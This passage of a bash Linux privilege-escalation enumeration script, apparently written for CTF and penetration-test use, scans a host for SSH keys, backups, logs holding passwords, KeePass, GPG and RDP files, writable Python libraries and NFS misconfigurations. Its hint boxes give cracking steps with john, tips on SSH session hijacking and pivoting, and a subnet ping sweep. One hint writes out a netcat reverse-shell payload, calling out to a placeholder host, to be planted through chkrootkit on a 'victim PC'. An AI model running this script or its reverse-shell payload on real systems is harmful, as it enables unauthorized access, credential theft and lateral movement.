    find / -iname id_dsa 2>/dev/null
echo -e "\n${BLUE}╔═════{ authorized_keys:${XX}"
    find / -iname authorized_keys 2>/dev/null
echo -e "\n${BLUE}╔═════{ ssh_config File:${XX}"
    if [ -f /etc/ssh/ssh_config ]; 
        then
            ls -la /etc/ssh/ssh_config --color=always
            echo -e "\n${BLUE}    ══{ Reading ssh_config File:${XX}"
                cat /etc/ssh/ssh_config
        else
            echo -e "${RED}	File does not exist${XX}"
    fi
echo -e "\n${BLUE}╔═════{ sshd_config File:${XX}"
    if [ -f /usr/share/openssh/sshd_config ]; 
        then
            ls -la /usr/share/openssh/sshd_config --color=always 2>/dev/null
            echo -e "\n${BLUE}    ══{ Reading sshd_config File:${XX}"
            cat /usr/share/openssh/sshd_config 2>/dev/null
                echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
                echo -e "\t║Read more about sshd_config file:                                                                                   ║"
                echo -e "\t║    https://www.ssh.com/academy/ssh/sshd_config                                                                     ║"
                echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
        else
            echo -e "${RED}	File does not exist${XX}"
    fi
echo -e "\n${BLUE}╔═════{ hosts.denied:${XX}"
    if [ -f /etc/hosts.denied ]; 
        then
            ls -la /etc/hosts.denied --color=always 2>/dev/null
            echo -e "\n${BLUE}    ══{ Reading hosts.denied:${XX}"
            cat /etc/hosts.denied 2>/dev/null
        else
            echo -e "${RED}	File does not exist${XX}"
    fi
echo -e "\n${BLUE}╔═════{ hosts.allow:${XX}"
        if [ -f /etc/hosts.allow ]; 
        then
            ls -la /etc/hosts.allow --color=always 2>/dev/null
            echo -e "\n${BLUE}    ══{ Reading hosts.allow:${XX}"
                cat /etc/hosts.allow 2>/dev/null
                echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
                echo -e "\t║When a client attempts to connect to a network service on a remote system, these files are used to determine whether║"
                echo -e "\t║client access is allowed or denied. Use /etc/hosts.allow and /etc/hosts.deny to define rules that selectively allow ║"
                echo -e "\t║or deny clients access to server daemons on local system. Read More:                                                ║"
                echo -e "\t║    https://www.thegeekdiary.com/understanding-tcp-wrappers-in-linux/                                               ║"
                echo -e "\t║    http://www.freekb.net/Article?id=1091                                                                           ║"
                echo -e "\t║    https://www.smartdomotik.com/2015/02/09/using-etchosts-allow-and-etchosts-deny-to-secure-unix/                  ║"
                echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
        else
            echo -e "${RED}	File does not exist${XX}"
    fi
echo -e "\n${BLUE}╔═════{ Any active SSH session:${XX}"
    ps aux | grep sshd
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║If any session is found, the session can be hijacked. Read more about SSH session hijacking:                        ║"
        echo -e "\t║    https://xorl.wordpress.com/2018/02/04/ssh-hijacking-for-lateral-movement/                                       ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n"
echo -e "${RED} \t\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════╗${XX}"
echo -e "${RED} \t\t ═════════════════════════════════════════════[ Extra Creds ]════════════════════════════════════════════ ${XX}"
echo -e "${RED} \t\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════╝${XX}"
echo -e "\n"
echo -e "\n${BLUE}╔═════{ Any odd files in :${XX}"
echo -e "\n${BLUE}    ══{ Optional sofware application /opt:${XX}"
    ls -l /opt/
echo -e "\n${BLUE}    ══{ Read-only user application /usr:${XX}"
    ls -l /usr/
echo -e "\n${BLUE}    ══{ Variable data files /var:${XX}"
    ls -l /var/
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║Are there any files that can be abused or writable to get root?                                                     ║"
        echo -e "\t║    https://www.linux.com/training-tutorials/linux-filesystem-explained/                                            ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Mail Applications:${XX}"
    which sendmail 2>/dev/null
    which exim 2>/dev/null
echo -e "\n${BLUE}╔═════{ Mail File:${XX}"
    ls -la /var/mail/ --color=always 2>/dev/null
echo -e "\n${BLUE}╔═════{ Reading Mail File:${XX}"
    cat /var/mail/*
echo -e "\n${BLUE}╔═════{ List Root Directory:${XX}"
    ls -la /root/
echo -e "\n${BLUE}╔═════{ Home Directory:${XX}"
    ls -la /home/ --color=always 2>/dev/null
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║Have a look at those files/folders and see if you get any usefull information.                                      ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Tmp Directory:${XX}"
    ls -la /tmp  --color=always 2>/dev/null
echo -e "\n${BLUE}╔═════{ Backup Directory:${XX}"
    ls -la /var/backups 2>/dev/null && find / -type f  -iname *backup* -o -iname *.bak -o -iname *.bak* -o -iname *.bck -o -iname *.bk -o -iname *.old*  2>/dev/null  | xargs ls -la 2>/dev/null --color=always | grep backup
echo -e "\n${BLUE}╔═════{ .bak Files:${XX}"
    find / -iname *.bak -type f 2>/dev/null | xargs ls -la 2>/dev/null
        echo -e "\t╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║Explore any interesting backup filename.                                                                      ║"
        echo -e "\t╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ usr/local/bin/backup:${XX}"
    if [ -f /usr/local/bin/backup ]; 
        then
            echo -e "\n${BLUE}    ══{ backup File permision:${XX}"
                ls -la /usr/local/bin/backup 2>/dev/null
            echo -e "\n${RED}    ══{ Exploit:${XX}"
                echo -e “https://infosecwriteups.com/node-htb-vulnhum-vm-358be0bf616b”
        else
            echo -e "${RED}	File does not exist${XX}"
    fi
echo -e "\n${BLUE}╔═════{ Apache2 Version:${XX}"
    apache2 -v 2>/dev/null; httpd -v 2>/dev/null
echo -e "\n${BLUE}╔═════{ Apache user:${XX}"
    if [ -f /etc/apache2/envvars ]; 
        then
            grep --color=always -i 'user\|group' /etc/apache2/envvars 2>/dev/null --color=always 
        else
            echo -e "${RED}	File does not exist${XX}"
    fi
echo -e "\n${BLUE}╔═════{ Apache Config File:${XX}"
    if [ -f /var/apache2/config.inc ]; 
        then
            cat /var/apache2/config.inc 2>/dev/null 
        else
            echo -e "${RED}	File does not exist${XX}"
    fi 
echo -e "\n${BLUE}╔═════{ Check readability of apache/nginx access log:${XX}"
    if [ -f /var/log/apache/access.log ]; 
        then
            echo -e "\n${BLUE}    ══{ Apache File permision:${XX}"
                ls -la /var/log/apache/access.log 2>/dev/null
            echo -e "\n${BLUE}    ══{ Reading apache:${XX}"
                cat /var/log/apache/access.log 2>/dev/null | grep -i "user\|pass" 2>/dev/null 
        else
            echo -e "${RED}	Apache does not exist${XX}"
    fi
    if [ -f /var/log/apache2/access.log ]; 
        then
            echo -e "\n${BLUE}    ══{ Apache2 File permision:${XX}"
                ls -la /var/log/apache2/access.log 2>/dev/null
            echo -e "\n${BLUE}    ══{ Reading apache2:${XX}"
                cat /var/log/apache2/access.log 2>/dev/null | grep -i "user\|pass" 2>/dev/null 
        else
            echo -e "${RED}	Apache2 does not exist${XX}"
    fi
    if [ -f /var/log/nginx/access.log ]; 
        then
            echo -e "\n${BLUE}    ══{ nginx File permision:${XX}"
                ls -la /var/log/nginx/access.log 2>/dev/null
            echo -e "\n${BLUE}    ══{ Reading nginx:${XX}"
                nginx= cat /var/log/nginx/access.log 2>/dev/null
        else
            echo -e "${RED}	nginx does not exist${XX}"
    fi
echo -e "\n${BLUE}╔═════{ /etc/exports:${XX}"
    if [ -f /etc/exports ]; 
        then
            cat /etc/exports | grep -E no_root_squash 2>/dev/null
                echo -e "\t╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
                echo -e "\t║${RED}Exploit:${XX}                                                                                                      ║"
                echo -e "\t║https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe            ║"
                echo -e "\t║https://steflan-security.com/linux-privilege-escalation-exploiting-nfs-shares/                                ║"
                echo -e "\t║    https://www.trenchesofit.com/2021/02/15/offensive-security-proving-grounds-banzai-write-up-no-metasploit/ ║"
                echo -e "\t╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
        else
            echo -e "${RED}	File does not exist${XX}"
    fi
echo -e "\n${BLUE}╔═════{ MySQL Version:${XX}"
    mysql --version 2>/dev/null --color=always
        echo -e "\t╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║Vuln versions:                                                                                                ║"
        echo -e "\t║5.7.30 MySQL Community Server (GPL)                                                                           ║"
        echo -e "\t║4.x/5.0 (Linux) - User-Defined Function Dynamic Library                                                       ║"
        echo -e "\t║    https://www.trenchesofit.com/2021/02/15/offensive-security-proving-grounds-banzai-write-up-no-metasploit/ ║"
        echo -e "\t╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Is mysql service running as root:${XX}"
    ps -aux | grep mysql 2>/dev/null --color=always
        echo -e "\t╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║${RED}If so${XX}, escalate privilege root via user defined database functions (UDFs)                                     ║"
        echo -e "\t║    hthttps://steflan-security.com/linux-privilege-escalation-exploiting-user-defined-functions/              ║"
        echo -e "\t║    https://medium.com/r3d-buck3t/privilege-escalation-with-mysql-user-defined-functions-996ef7d5ceaf         ║"
        echo -e "\t╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ MySQL:${XX}"
    if [ -f /var/lib/mysql ]; 
        then
            ls -la /var/lib/mysql 2>/dev/null --color=always
        else
            echo -e "${RED}	File does not exist${XX}"
    fi
echo -e "\n${BLUE}╔═════{ Log File:${XX}"
    ls -la /var/log 2>/dev/null --color=always
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║Do the following and see if there is any password:-                                         ║"
        echo -e "\t║    grep -r passw . 2>/dev/null                                                             ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ /var/www/ files:${XX}"
    ls -la /var/www --color=always 2>/dev/null
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║Have a look at those files/folders and see if you get any usefull information.                                      ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Spool File:${XX}"
    ls -la /var/spool 2>/dev/null --color=always
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║Contains data which is awaiting some kind of later processing. Data in /var/spool represents║"
        echo -e "\t║work to be done in the future (by a program, user, or administrator); often data is deleted ║"
        echo -e "\t║PS: Have a look at the mail directory.                                                      ║"
        echo -e "\t║after it has been processed. Read More:                                                     ║"
        echo -e "\t║    https://refspecs.linuxfoundation.org/FHS_3.0/fhs/ch05s14.html                           ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ PostgreSQL Version:${XX}"
    psql -V 2>/dev/null
echo -e "\n${BLUE}╔═════{ PostgreSQL:${XX}"
    if [ -f /var/lib/pgsql ]; 
        then
            ls -la /var/lib/pgsql 2>/dev/null
        else
            echo -e "${RED}	PostgreSQL does not exist${XX}"
    fi
echo -e "\n${BLUE}╔═════{ System files dont belong to root:${XX}"
    find /lib/systemd/ \! -uid 0 -type f 2>/dev/null | xargs -r ls -la 2>/dev/null --color=always
echo -e "\n${BLUE}╔═════{ Tools/Languages Installed:${XX}"
    which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║Some of the tools have an exploit, do compgen -c to list all of the tools. Exploit:         ║"
        echo -e "\t║    https://gtfobins.github.io/                                                             ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Config Files:${XX}"
    find / -iname *.config -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always
echo -e "\n${BLUE}╔═════{ Bash Files 'Excluded /usr/ | /opt/':${XX}"
    find / -iname *.sh -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always | grep -v "/usr/\|/opt/"
echo -e "\n${BLUE}╔═════{ Python Files 'Excluded file in /usr/ | /opt/':${XX}"
    find / -iname *.py -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always | grep -v "/usr/share/\|/usr/bin/\|/usr/lib/\|/usr/share/\|/usr/local/\|/var/lib/\|/opt/firmware-mod-kit/\|/opt/xplico/\|/opt/lib/|"
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║If the file is owned by root and can be executed by the current user, try to read it, maybe ║"
        echo -e "\t║the file can be exploitd by abusing it's library                                            ║"
        echo -e "\t║    https://0xatom.github.io/tryhackme/2021/01/04/thm-wonderland/                           ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Any writable Python files:${XX}"
    find /usr/lib/python* -writable 2>/dev/null
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║If the file is owned by root and writable to the curent user, you may hijack the file and   ║"
        echo -e "\t║& gain RCE. IF-&-ONLY-IF any python file is running by root & needs to import that library  ║"
        echo -e "\t║Ex: Hijacking library:                                                                      ║"
        echo -e "\t║    https://rastating.github.io/privilege-escalation-via-python-library-hijacking/          ║"
        echo -e "\t║    https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-friendzone/   ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ PHP Files 'Excluded /usr/ | /opt/':${XX}"
    find / -iname *.php -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always | grep -v "/usr/\|/opt/"
echo -e "\n${BLUE}╔═════{ Grep hardcoded passwords in *.php files:${XX}"
    find / -name "*.php" -print0 2>/dev/null | xargs -0 grep -i -n "var "$"password" --color=always
echo -e "\n${BLUE}╔═════{ Text Files 'Excluded /usr/ | /opt/ | /etc/':${XX}"
    find / -iname *.txt -type f 2>/dev/null | xargs ls -la 2>/dev/null | grep -v "/usr/\|/opt/\|/lib/\|/etc/"
echo -e "\n${BLUE}╔═════{ HTML Files 'Excluded /usr/':${XX}"
    find / -iname *.html -type f 2>/dev/null | xargs ls -la --color=always 2>/dev/null | grep -v "/usr/"
echo -e "\n${BLUE}╔═════{ GPG Files:${XX}"
    find / -iname *.gpg -type f 2>/dev/null | grep -v "/usr/\|/var/"
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║A GPG file is a security key used to decrypt an encrypted file generated by GNU Privacy     ║"
        echo -e "\t║Guard (GnuPG), a file encryption program. The secure format is based on the OpenPGP         ║"
        echo -e "\t║standard defined by RFC2440,the same standard Pretty Good Privacy (.PGP) files use.         ║"
        echo -e "\t║The file can be cracked by using one of the following steps:                                ║"
        echo -e "\t║  A) gpg --batch --passphrase ABCD -d file.gpg                                              ║"
        echo -e "\t║  B) gpg2john file.gpg > hash                                                               ║"
        echo -e "\t║     john hash -w=all                                                                       ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ .pyc Files:${XX}"
    find / -iname *.pyc -type f 2>/dev/null | xargs ls -la --color=always 2>/dev/null | grep -v "/usr/\|/var/" 
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║Send the .pyc file to attacker PC and download uncompyle6 to decompile the file             ║"
        echo -e "\t║    uncompyle6 .pyc                                                                         ║"
        echo -e "\t║Try to understand how the file is writen and find out any possible way for PE               ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ KeePass database file:${XX}"
    find / -name *.kdbx -o -name *.kdb -type f 2>/dev/null 2>/dev/null
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║KeePass is a free open source password manager, which helps you to manage your passwords in ║"
        echo -e "\t║a secure way. You can store all your passwords in one database, which is locked with a      ║"
        echo -e "\t║master key. There are many exploits on the internet.                                        ║"
        echo -e "\t║${RED}Exploit:${XX}                                                                                    ║"
        echo -e "\t║    Get the file to your local PC                                                           ║"
        echo -e "\t║    keepass2john file.kdbx > hash                                                           ║"
        echo -e "\t║    john hash                                                                               ║" 
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Win Zip Files:${XX}"
    find / -iname *.zip -type f 2>/dev/null | grep -v "/usr/"
echo -e "\n${BLUE}╔═════{ Win RAR Files:${XX}"
    find / -iname *.rar -type f 2>/dev/null | grep -v "/usr/"
echo -e "\n${BLUE}╔═════{ Image Files:${XX}"
    echo -e "\n${BLUE}    ══{ TIFF:${XX}"
    find / -iname *.tif -type f 2>/dev/null | grep -v "/usr/"
    find / -iname *.tif -type f 2>/dev/null | grep -v "/usr/"
    echo -e "\n${BLUE}    ══{ Bitmap:${XX}"
    find / -iname *.bmp -type f 2>/dev/null | grep -v "/usr/"
    echo -e "\n${BLUE}    ══{ JPEG:${XX}"
    find / -iname *.jpg -type f 2>/dev/null | grep -v "/usr/"
    find / -iname *.jpeg -type f 2>/dev/null | grep -v "/usr/"
    echo -e "\n${BLUE}    ══{ GIF:${XX}"
    find / -iname *.gif -type f 2>/dev/null | grep -v "/usr/"
    echo -e "\n${BLUE}    ══{ EPS:${XX}"
    find / -iname *.eps -type f 2>/dev/null | grep -v "/usr/"
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║Use steganography tools and find out any hidden strings or usefull info.                    ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Print IPSEC VPN Keys (requires root):${XX}"
    ip xfrm state list
echo -e "\n${BLUE}╔═════{ OpenLDAP Configuration:${XX}"
    cat /etc/openldap/ldap.conf 2>/dev/null
echo -e "\n${BLUE}╔═════{ Current user trash files:${XX}"
    ls -la ~/.local/share/Trash/ 2>/dev/null
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║Have a look at the trash files and see if you can find any useful information.              ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Wireshark files:${XX}"
    find / -name *.pcapng -o -name *.libpcap -type f 2>/dev/null | grep -v "/usr/"
echo -e "\n${BLUE}╔═════{ RDP Profiles:${XX}"
    find / -name *.RDP -o -name *.rdp -type f 2>/dev/null
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║Decode the RDP Password using Cain & Abel. So, open Cain & Adel the go to                   ║"
        echo -e "\t║    Tools > Remote Desktop Password Decoder $ then load the RDP profile to decode.          ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Chkrootkit:${XX}"
    grep -rnw -i "ROOTDIR is" --color=always 2>/dev/null & sleep 10 ; kill $!
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║If the system is running chkrootkit, run nc on attacker pc and run the following command on ║"
        echo -e "\t║victim PC:-                                                                                 ║"
        echo -e "\t║echo '#!/bin/bash' > update                                                                 ║"
        echo -e "\t║echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc a.a.a.a 1234 >/tmp/f' >> update ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Modified Files Past 60 min:${XX}"
    find / -mmin -60 -xdev 2>/dev/null | grep -v '/proc/\|/sys/\|/run/\|/dev/\|/var/' | xargs ls -ld --color=always 2> /dev/null
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║It can be useful to check files that were modified recently, as they may be containing      ║"
        echo -e "\t║useful information and/or credentials.                                                      ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Git Server Enumeration:${XX}"
    find / -type d -name git-server -print 2>/dev/null
echo -e "\n${BLUE}╔═════{ Git User:${XX}"
    cat /etc/passwd | grep git-shell 2>/dev/null
echo -e "\n${BLUE}╔═════{ OpenVPN Files:${XX}"
    find / -iname *.ovpn -type f 2>/dev/null
echo -e "${RED} \t\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════╗${XX}"
echo -e "${RED} \t\t ════════════════════════════════════════[ Scanning Target Network ]═════════════════════════════════════ ${XX}"
echo -e "${RED} \t\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════╝${XX}"
echo -e "\n${BLUE}╔═════{ Pivoting:${XX}"
    echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
    echo -e "\t║Try to scan the host network and see if there is any other host online. However, we won't be able to access those   ║"
    echo -e "\t║machine. Therefor, we have to do tunneling from the current machine to them.                                        ║"
    echo -e "\t║Read More:                                                                                                          ║"
    echo -e "\t║  https://nullsweep.com/pivot-cheatsheet-for-pentesters/                                                            ║"
    echo -e "\t║  https://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.html                                                ║"
    echo -e "\t║  https://pentest.blog/explore-hidden-networks-with-double-pivoting/                                                ║"
    echo -e "\t║  https://www.offensive-security.com/metasploit-unleashed/pivoting/                                                 ║"
    echo -e "\t║  https://ivanitlearning.wordpress.com/2019/03/08/client-side-exploitation-windows-pivoting-w-o-metasploit/         ║"
    echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Usefull tools for network scanning:${XX}"
echo -e "\n${BLUE}    ══{ Nmap:${XX}"
    if [ -f /usr/bin/nmap ];
        then
            echo "  Nmap is installed on the system, use it to scan the host network"
        else
            echo -e "  Nmap is not installed"
    fi
echo -e "\n${BLUE}    ══{ Netcat:${XX}"
    if [ -f /usr/bin/nc ];
        then
            echo "  Netcat is installed on the system, use it to scan the host network"
        else
            echo -e "  Netcat is not installed"
    fi
echo -e "\n${BLUE}    ══{ fping:${XX}"
    if [ -f /usr/bin/fping ];
        then
            echo "  fping is installed on the system, use it to scan the host network"
        else
            echo -e "  fping is not installed"
    fi
echo -e "\n${BLUE}    ══{ ping:${XX}"
    if [ -f /usr/bin/ping ];
        then
            echo "  ping is installed on the system, use it to scan the host network"
        else
            echo -e "  ping is not installed"
    fi
    echo -e "\n"
    read -p "    ══{ Do you want to scan target network using 'for loop'? [Y/N]:" input
        if [[ $input == "Y" || $input == "y" ]]; then
            read -p "Enter 1st octic : " O1
            read -p "Enter 2nd octic : " O2
            read -p "Enter 3rd octic : " O3
            echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
            echo -e "\t║This will scan all 255 IPs, and may take time based on the network range, please be patient. This will run normal   ║"
            echo -e "\t║for loop in our case.                                                                                               ║"
            echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
            for i in {1..255}; do (ping $O1.$O2.$O3.$i -c 1 -w 5  >/dev/null && echo -e "Host $O1.$O2.$O3.$i is alive"); done
        else
            echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
            echo -e "\t║Please have a look at the host network & findout if there is any device that you may pivite to. You can do it by any║"
            echo -e "\t║of the following loop commands:                                                                                     ║"
            echo -e '\t║    for ip in $(seq 1 255); do ping -c 1 A.B.C.$ip | grep "bytes from"; done                                        ║'
            echo -e '\t║    for i in {1..255}; do ping -c 1 A.B.C.$i | grep "bytes from"; done                                              ║'
            echo -e '\t║    for i in {1..255}; do (ping A.B.C.$i -c 1 -w 5  >/dev/null && echo -e "Host with IP $i Is Alive"); done         ║'
            echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
        fi
echo -e "\n\n${RED}\t\tEnumeration is completed ╔═══════════════════════════════════(100%)═══════════════════════════════════╗${XX}\n\n"
